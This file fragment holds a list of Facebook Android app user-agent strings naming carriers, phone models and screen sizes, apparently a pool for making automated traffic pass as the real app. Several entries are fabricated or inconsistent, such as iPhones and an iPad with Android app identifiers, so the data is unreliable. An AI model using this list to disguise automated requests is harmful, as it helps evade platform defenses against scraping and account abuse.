    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Motorola;FBBD/Moto G Power;FBPN/com.facebook.katana;FBDV/Motorola Moto G Power;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
	'FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/Sprint;FBMF/Google;FBBD/Pixel 4;FBPN/com.facebook.katana;FBDV/Google Pixel 4;FBSV/11;FBOP/1;FBCA/arm64-v8a;',
    'FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/iPhone;FBBD/iPhone 12;FBPN/com.facebook.katana;FBDV/iPhone 12;FBSV/11;FBOP/1;FBCA/arm64-v8a;',
    'FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/Verizon;FBMF/iPhone;FBBD/iPhone XR;FBPN/com.facebook.katana;FBDV/iPhone XR;FBSV/11;FBOP/1;FBCA/arm64-v8a;',
    'FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/T-Mobile;FBMF/iPad;FBBD/iPad Pro;FBPN/com.facebook.katana;FBDV/iPad Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a;',
    'FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/Sprint;FBMF/Samsung;FBBD/Galaxy Note 10;FBPN/com.facebook.katana;FBDV/Samsung Galaxy Note 10;FBSV/11;FBOP/1;FBCA/arm64-v8a;',
    'FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Motorola;FBBD/Moto G Stylus;FBPN/com.facebook.katana;FBDV/Motorola Moto G Stylus;FBSV/11;FBOP/1;FBCA/arm64-v8a;',
    'FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/Verizon;FBMF/Google;FBBD/Pixel 5;FBPN/com.facebook.katana;FBDV/Google Pixel 5;FBSV/11;FBOP/1;FBCA/arm64-v8a;',
    'FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/T-Mobile;FBMF/LG;FBBD/LG Velvet;FBPN/com.facebook.katana;FBDV/LG Velvet;FBSV/11;FBOP/1;FBCA/arm64-v8a;',
    'FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/Sprint;FBMF/iPhone;FBBD/iPhone 11;FBPN/com.facebook.katana;FBDV/iPhone 11;FBSV/11;FBOP/1;FBCA/arm64-v8a;',
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=720,height=1280};FBLC/en_US;FBRV/492627149;FBCR/Verizon;FBMF/Samsung;FBBD/Galaxy S9;FBPN/com.facebook.katana;FBDV/Samsung Galaxy S9;FBSV/9;FBOP/1;FBCA/armeabi-v7a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.0,width=1080,height=2340};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/LG;FBBD/LG G8;FBPN/com.facebook.katana;FBDV/LG G8;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.75,width=1080,height=2340};FBLC/en_US;FBRV/492627149;FBCR/Sprint;FBMF/Google;FBBD/Pixel 4;FBPN/com.facebook.katana;FBDV/Google Pixel 4;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.0,width=720,height=1520};FBLC/en_US;FBRV/492627149;FBCR/T-Mobile;FBMF/Samsung;FBBD/Galaxy A20;FBPN/com.facebook.katana;FBDV/Samsung Galaxy A20;FBSV/9;FBOP/1;FBCA/armeabi-v7a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2280};FBLC/en_US;FBRV/492627149;FBCR/Verizon;FBMF/Motorola;FBBD/Moto G7;FBPN/com.facebook.katana;FBDV/Motorola Moto G7;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.5,width=1440,height=2960};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Samsung;FBBD/Galaxy S20;FBPN/com.facebook.katana;FBDV/Samsung Galaxy S20;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/Sprint;FBMF/OnePlus;FBBD/OnePlus 7T;FBPN/com.facebook.katana;FBDV/OnePlus 7T;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.0,width=720,height=1440};FBLC/en_US;FBRV/492627149;FBCR/T-Mobile;FBMF/LG;FBBD/LG G6;FBPN/com.facebook.katana;FBDV/LG G6;FBSV/9;FBOP/1;FBCA/armeabi-v7a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.0,width=1080,height=2220};FBLC/en_US;FBRV/492627149;FBCR/Verizon;FBMF/Google;FBBD/Pixel 3;FBPN/com.facebook.katana;FBDV/Google Pixel 3;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Motorola;FBBD/Moto G Power;FBPN/com.facebook.katana;FBDV/Motorola Moto G Power;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
    'FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Samsung;FBBD/Galaxy S20;FBPN/com.facebook.katana;FBDV/Samsung Galaxy S20;FBSV/11;FBOP/1;FBCA/arm64-v8a;'
    'FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.5,width=1600,height=2560};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Amazon;FBBD/Fire HD 10;FBPN/com.facebook.katana;FBDV/Fire HD 10;FBSV/9;FBOP/1;FBCA/arm64-v8a;',
    'FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Poco;FBBD/Poco X3;FBPN/com.facebook.katana;FBDV/Poco X3;FBSV/11;FBOP/1;FBCA/arm64-v8a;',
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/492627149;FBCR/Verizon;FBMF/Samsung;FBBD/Galaxy S10;FBPN/com.facebook.katana;FBDV/Galaxy S10;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1440,height=2960};FBLC/en_US;FBRV/492627149;FBCR/T-Mobile;FBMF/Google;FBBD/Pixel 4;FBPN/com.facebook.katana;FBDV/Pixel 4;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=1.5,width=720,height=1280};FBLC/en_US;FBRV/492627149;FBCR/Sprint;FBMF/LG;FBBD/LG G8;FBPN/com.facebook.katana;FBDV/LG G8;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.0,width=1440,height=3200};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Sony;FBBD/Xperia 1;FBPN/com.facebook.katana;FBDV/Xperia 1;FBSV/12;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=1.5,width=750,height=1334};FBLC/en_US;FBRV/492627149;FBCR/Verizon;FBMF/Apple;FBBD/iPhone 8;FBPN/com.facebook.katana;FBDV/iPhone 8;FBSV/14;FBOP/1;FBCA/arm64-v8a;",
    "[FBAN/FB4A;FBAV/365.0.0.28.25;FBBV/943557840;FBRV/0;FBPN/com.facebook.katana;FBLC/es_ES;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia N472 Max;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;] ",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.0,width=1080,height=1920};FBLC/en_US;FBRV/492627149;FBCR/T-Mobile;FBMF/OnePlus;FBBD/OnePlus 7;FBPN/com.facebook.katana;FBDV/OnePlus 7;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=1.5,width=1080,height=2340};FBLC/en_US;FBRV/492627149;FBCR/Sprint;FBMF/Xiaomi;FBBD/Xiaomi Mi 9;FBPN/com.facebook.katana;FBDV/Xiaomi Mi 9;FBSV/10;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=3.5,width=1600,height=2560};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Amazon;FBBD/Fire HD 10;FBPN/com.facebook.katana;FBDV/Fire HD 10;FBSV/9;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=1.0,width=720,height=1280};FBLC/en_US;FBRV/492627149;FBCR/Verizon;FBMF/Huawei;FBBD/Huawei P20;FBPN/com.facebook.katana;FBDV/Huawei P20;FBSV/8;FBOP/1;FBCA/arm64-v8a;",
    "FBAN/FB4A;FBAV/422.0.0.26.76;FBBV/491367823;FBDM/{density=2.5,width=1080,height=2400};FBLC/en_US;FBRV/492627149;FBCR/AT&T;FBMF/Poco;FBBD/Poco X3;FBPN/com.facebook.katana;FBDV/Poco X3;FBSV/11;FBOP/1;FBCA/arm64-v8a;",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=888};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 610;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=888};FBLC/en_US;FBCR/ETB 4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1022;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=904};FBLC/en_US;FBCR/vodafone IE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E2105;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/en_GB;FBCR/Tesco Mobile;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/6016X;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G3815;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Koodo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I257M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/Personal;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300M;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/ko_KR;FBCR/Rogers;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I257M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/nl_NL;FBCR/vodafone NL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=790,height=480};FBLC/en_GB;FBCR/eir;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 510;FBSV/4.4.3;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=800,height=480};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I8190N;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=960,height=540};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9192;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=1196,height=720};FBLC/en_GB;FBCR/3;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 620;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=1196,height=720};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 620;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=1200,height=1834};FBLC/en_GB;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-V500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/3;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/G7-L01;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/AT&-T;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/eir;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/G7-L01;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/de_DE;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/de_DE;FBCR/Telekom.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N7105;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/3;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/G620S-L01;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IDEA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IDEA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/3 IRL;FBMF/bq;FBBD/bq;FBPN/com.facebook.katana;FBDV/Aquaris E5;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/3;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One mini;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Entel 4G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N7100;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/VODAFONE IN;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/HM 1S;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SCH-I535;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/WIND;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-T999V;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/XL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N750;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_ES;FBCR/;FBMF/alps;FBBD/alps;FBPN/com.facebook.katana;FBDV/GT;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_ES;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500H;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_ES;FBCR/Movistar;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/G620S-L01;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500H;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/Entel 4G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300I;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/Movil GSM ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9305;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G720AX;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/TIM 41;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800H;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One X;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-T999;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800H;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_CA;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I317M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_FR;FBCR/Proximus;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/nb_NO;FBCR/TDC;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9305;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=800,height=1280};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N7000;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6903;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/vodafone IE;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D802;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/Movil GSM ;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6916;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/VIVA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6906;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telecel Bolivia GSM;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/One;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telstra Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900I;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9506;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
